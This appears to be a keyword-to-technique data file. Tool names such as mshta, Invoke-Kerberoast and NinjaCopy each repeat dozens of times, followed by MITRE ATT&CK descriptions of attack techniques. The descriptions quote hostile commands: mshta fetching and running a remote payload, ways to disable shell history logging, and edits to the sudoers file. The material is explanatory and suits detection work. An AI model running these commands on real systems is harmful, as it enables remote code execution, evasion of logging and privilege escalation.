mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
mshta.exe
Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) 

Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)

Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>

They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
pass-the-ticket
Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.

When preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)

A [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)

A [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)

Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, "overpassing the hash" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Invoke-Kerberoast 
Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) 

Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)

Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)

This same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)

Cracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
looks for net and account or domain in close proximity 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 net accounts 
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
 Get-PassPol
Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).

Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code> (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to discover password policy information (e.g. <code>show aaa</code>, <code>show aaa common-criteria policy all</code>).(Citation: US-CERT-TA18-106A)

Password policies can be discovered in cloud environments using available APIs such as <code>GetAccountPasswordPolicy</code> in AWS (Citation: AWS GetPasswordPolicy).
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
cron
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
winrm
Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.

WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the `winrm` command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014) WinRM  can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).(Citation: MSDN WMI)
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
BITSadmin  
Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

The interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin)

Adversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)

BITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
spwebmember 
Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization. 

The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:

* Policies, procedures, and standards
* Physical / logical network diagrams
* System architecture diagrams
* Technical system documentation
* Testing / development credentials
* Work / project schedules
* Source code snippets
* Links to network shares and other internal resources

Information stored in a repository may vary based on the specific instance or environment. Specific common information repositories include web-based platforms such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) and [Confluence](https://attack.mitre.org/techniques/T1213/001), specific services such as Code Repositories, IaaS databases, enterprise databases, and other storage infrastructure such as SQL Server.
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
LC_LOAD_DYLIB 
Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.(Citation: Writing Bad Malware for OSX) There are tools available to perform these changes.

Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.(Citation: Malware Persistence on OS X)
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
HISTCONTROL
Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. 

On Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.

Adversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to "ignorespace". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to "ignoredups". In some Linux systems, this is set by default to "ignoreboth" which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. 

On Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)

Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
NinjaCopy
Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)

Utilities, such as NinjaCopy, exist to perform these actions in PowerShell. (Citation: Github PowerSploit Ninjacopy)
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
regasm.exe 
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
 regsvcs.exe
Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)

Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
MS14-068
Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain access to systems. One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
sudo
Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.

Within Linux and MacOS systems, sudo (sometimes referred to as "superuser do") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command "allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments."(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).

The sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.

Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.

In the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \'Defaults !tty_tickets\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
InstallUtil.exe
Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> and <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>.

InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil)
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
net view 
